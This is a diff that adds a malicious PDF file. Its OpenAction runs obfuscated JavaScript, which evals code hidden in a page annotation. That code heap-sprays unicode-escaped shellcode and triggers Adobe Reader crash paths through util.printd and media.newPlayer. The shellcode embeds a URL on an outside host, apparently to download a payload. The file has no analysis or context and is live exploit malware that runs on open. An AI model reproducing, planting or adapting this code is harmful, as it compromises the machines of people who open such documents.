@@ -1,0 +1,106 @@
+%PDF-1.3
+%&#1074;&#1075;&#1055;&#1059;
+1 0 obj
+<<
+/Outlines 2 0 R
+/OpenAction 3 0 R
+/Pages 4 0 R
+/Type /Catalog
+>>
+endobj
+2 0 obj
+<<
+/Count 0
+/Type /Outlines
+>>
+endobj
+4 0 obj
+<<
+/Kids [5 0 R]
+/Count 1
+/Type /Pages
+>>
+endobj
+5 0 obj
+<<
+/Parent 4 0 R
+/Annots [6 0 R]
+/MediaBox [0 0 612 792]
+/pdftk_PageNum 1
+/Type /Page
+>>
+endobj
+6 0 obj
+<<
+/Subtype /Text
+/Subj 7 0 R
+/Name /Comment
+/Type /Annot
+/Rect [25 100 60 115]
+>>
+endobj
+3 0 obj
+<<
+/JS 8 0 R
+/Type /Action
+/S /JavaScript
+>>
+endobj
+8 0 obj
+<<
+/Length 533
+>>
+stream
+
+var jINVBkdYsR1 = "e";
+var ZcJlkvIdra3 = "%";
+var oCgftWJmQV17 = this[jINVBkdYsR1+"val"];
+var pMEmYaUfHX18 = this["un"+jINVBkdYsR1+"scap"+jINVBkdYsR1];
+oCgftWJmQV17("var wjwLViGhDy15 = /b"+jINVBkdYsR1+"x11/ig;");
+var EkhmNdRbdW10 = app["doc"];
+EkhmNdRbdW10["syncAnnotScan"]();
+var GajTwlEaJw4 = EkhmNdRbdW10["g"+jINVBkdYsR1+""+app.doc.URL.toLowerCase()[1]+"Annots"]( {  nPage: 0 });
+var roPmefWIye5 = GajTwlEaJw4[0]["subj"+jINVBkdYsR1+"ct"];
+if(app.doc.URL.substring(0,7).toLowerCase() == "http://") {eval(roPmefWIye5);}
+
+endstream
+endobj
+7 0 obj
+<<
+/Length 2314
+>>
+stream
+
+var shhhhh = unescape("%u9090%u9090%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%udc87%u6525%u07b4%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u87bf%uef10%uefef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc1a8%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u692F%u7A6E%u2E78%u726F%u2E67%u6E69%u692F%u646E%u7865%u2E34%u6870%u3F70%u7273%u3D63%u3835%u6726%u7270%u313D%u2631%u6B74%u3D72%u3131%u3832%u3132%u3332%u3939%u3337%u3233%u3132%u2636%u6B74%u6972%u343D%u3033%u3836%u3663%u6538%u3930%u6561%u3634%u3066%u3661%u6235%u6436%u3337%u3435%u6431%u6437%u2634%u3D65%u2638");
+var shellcode = shhhhh;
+var block = unescape("%u0c0c%u0c0c");
+var GDagaCuyNfRSFzaSZLO = unescape("%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u514e%u4865%u4844%u724f%u4a6e%u6d43%u4b51%u4b79%u7156%u4d41%u5944%u596b%u7979%u625a%u626f%u7a6e%u634e%u4a4d%u6341%u6253%u4154%u5670%u5543%u4273%u4c51%u576d%u5772%u5670");
+while (block.length <= 32768) { block += block; }
+block = block.substring(0, 32768 - shellcode.length);
+memory = new Array;
+for (i = 0; i < 8192; i++) { memory[i] = block + shellcode;}
+util.printd("rlpPpjTXXIncUhwagCzcuHfmkzObBSZDGNdC", new Date);
+util.printd("SotSxNQvMqKNjJkIXioKlmfZYfmiPGgGNNKn", new Date);
+try { this.media.newPlayer(null);} catch (e) {}
+util.printd(GDagaCuyNfRSFzaSZLO, new Date);
+endstream
+endobj xref
+0 9
+0000000000 65535 f
+0000000015 00000 n
+0000000100 00000 n
+0000000413 00000 n
+0000000148 00000 n
+0000000207 00000 n
+0000000313 00000 n
+0000000730 00000 n
+0000000475 00000 n
+trailer
+
+<<
+/Root 1 0 R
+/Size 9
+>>
+startxref
+36221
+%%EOF
